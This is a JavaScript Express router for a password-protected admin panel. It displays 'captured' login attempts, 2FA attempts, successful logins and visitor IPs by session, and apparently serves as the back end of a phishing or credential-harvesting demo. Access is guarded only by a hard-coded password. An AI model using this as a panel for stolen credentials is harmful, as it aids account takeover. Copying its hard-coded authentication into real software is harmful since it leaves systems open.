const express = require('express');
const router = express.Router();

// Password for admin access (change this to your preferred password)
const ADMIN_PASSWORD = 'educate2024';

// Middleware to check admin authentication
const requireAdminAuth = (req, res, next) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ 
      success: false, 
      error: 'Admin authentication required' 
    });
  }

  const password = authHeader.substring(7); // Remove "Bearer " prefix
  
  if (password !== ADMIN_PASSWORD) {
    return res.status(401).json({ 
      success: false, 
      error: 'Invalid admin password' 
    });
  }

  next();
};

// Apply auth middleware to all admin routes
router.use(requireAdminAuth);

// Admin dashboard - get all captured data
router.get('/', (req, res) => {
  try {
    const data = global.capturedData || [];
    
    const stats = {
      totalCaptured: data.length,
      loginAttempts: data.filter(item => item.type === 'LOGIN_ATTEMPT').length,
      twoFAAttempts: data.filter(item => item.type === '2FA_ATTEMPT').length,
      successfulLogins: data.filter(item => item.type === 'LOGIN_SUCCESS').length,
      uniqueIPs: [...new Set(data.map(item => item.ip))].length
    };

    res.json({
      success: true,
      stats: stats,
      data: data,
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('Admin data error:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// Get specific session data
router.get('/session/:sessionId', (req, res) => {
  try {
    const { sessionId } = req.params;
    const sessionData = global.capturedData.filter(item => item.sessionId === sessionId);
    
    res.json({
      success: true,
      sessionId: sessionId,
      data: sessionData
    });

  } catch (error) {
    console.error('Session data error:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

// Clear all data (for demo reset)
router.delete('/clear', (req, res) => {
  try {
    const previousCount = global.capturedData.length;
    global.capturedData = [];
    
    res.json({
      success: true,
      message: `Cleared ${previousCount} captured items`,
      clearedCount: previousCount
    });

  } catch (error) {
    console.error('Clear data error:', error);
    res.status(500).json({ success: false, error: 'Internal server error' });
  }
});

module.exports = router;